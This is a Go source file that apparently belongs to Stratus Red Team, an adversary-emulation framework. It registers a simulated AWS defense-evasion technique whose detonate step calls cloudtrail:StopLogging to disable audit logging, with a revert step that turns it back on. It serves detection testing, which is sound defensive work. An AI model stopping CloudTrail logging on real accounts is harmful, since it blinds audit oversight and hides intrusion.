package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/service/cloudtrail"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.defense-evasion.stop-cloudtrail",
		FriendlyName:       "Stop CloudTrail Trail",
		Platform:           stratus.AWS,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.DefenseEvasion},
		Description: `
Stops a CloudTrail Trail from logging. Simulates an attacker disrupting CloudTrail logging.

Warm-up: 

- Create a CloudTrail Trail.

Detonation: 

- Call cloudtrail:StopLogging to stop CloudTrail logging.
`,
		PrerequisitesTerraformCode: tf,
		IsIdempotent:               true, // cloudtrail:StopLogging is idempotent
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string) error {
	cloudtrailClient := cloudtrail.NewFromConfig(providers.AWS().GetConnection())
	trailName := params["cloudtrail_trail_name"]

	log.Println("Stopping CloudTrail trail " + trailName)

	_, err := cloudtrailClient.StopLogging(context.Background(), &cloudtrail.StopLoggingInput{
		Name: &trailName,
	})

	if err != nil {
		return errors.New("unable to stop CloudTrail logging: " + err.Error())
	}

	return nil
}

func revert(params map[string]string) error {
	cloudtrailClient := cloudtrail.NewFromConfig(providers.AWS().GetConnection())
	trailName := params["cloudtrail_trail_name"]

	log.Println("Restarting CloudTrail trail " + trailName)
	_, err := cloudtrailClient.StartLogging(context.Background(), &cloudtrail.StartLoggingInput{
		Name: &trailName,
	})

	return err
}
